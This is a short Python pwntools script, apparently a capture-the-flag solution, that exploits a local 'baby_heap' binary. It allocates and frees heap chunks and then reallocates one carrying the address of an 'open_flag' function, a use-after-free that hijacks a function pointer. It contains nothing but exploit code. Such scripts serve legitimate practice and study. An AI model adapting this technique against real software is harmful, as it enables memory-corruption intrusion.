from pwn import *

open_flag = 0x00000000004009b0
r = process("./baby_heap")
def free(idx):
	log.info("freeing at index : " + str(idx))
	r.sendlineafter("[?] Choice : ","4")
	r.sendlineafter("Index : ",str(idx))
	log.info("freed..")

def enter_name(data):
	r.sendlineafter("[?] Choice : ","1")
	r.sendlineafter("[?] Your Name : ",str(data))

def alloc(size,data):
	log.info("allocating heap..")
	r.sendlineafter("[?] Choice : ","2")
	r.sendlineafter("Size : ",str(size))
	r.sendlineafter("Content : ",str(data))
	log.info("succed")

def show(idx):
	r.sendlineafter("[?] Choice : ","3")
	r.sendlineafter("Index : ",str(idx))
	r.recvuntil("[+] Content : ")
	res = r.recvline()
	return res

def main():

	alloc(32,"ddaa")
	alloc(32,"ddaa")
	alloc(32,"ddaa")
	free(0)
	free(1)
	#free(0)
	alloc(8,p64(open_flag))
	r.sendlineafter("[?] Choice : ","3")
	r.sendlineafter("Index : ","0")
	r.interactive()



if __name__ == '__main__':
	main()